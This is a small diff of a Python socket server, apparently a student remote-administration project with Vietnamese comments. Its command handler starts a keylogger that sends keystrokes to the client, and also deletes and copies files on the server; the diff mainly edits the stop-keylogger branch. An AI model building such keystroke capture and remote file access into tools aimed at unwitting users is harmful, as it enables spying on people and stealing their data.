@@ -60,11 +60,8 @@ def handle_client(client_socket):
                 print("Starting keylogger...")
                 # Start the keylogger and send keystrokes to the client
                 start_keylogger(client_socket)
-            elif buffer.startswith("STOP_KEY_LOGGER"):
-            
-                print("Stopping keylogger...")
-                client_socket.close()
-                break         
+            elif buffer.startswith("STOP_KEY_LOGGER"):            
+                print("Stopping keylogger...")    
                 
             # Yêu cầu 6. Xóa files ; Copy files từ máy SERVER
             elif buffer.startswith("DELETE_FILE"):
@@ -72,8 +69,7 @@ def handle_client(client_socket):
                 delete_file(client_socket, file_path)
             elif buffer.startswith("COPY_FILE"):
                 file_path = buffer.split(" ", 1)[1]  # Lấy đường dẫn file từ lệnh
-                copy_file(client_socket, file_path)               
-                
+                copy_file(client_socket, file_path)       
                 
             elif buffer.startswith("GO BACK MENU LIST"):
                 print("Client requested to return to menu.")                
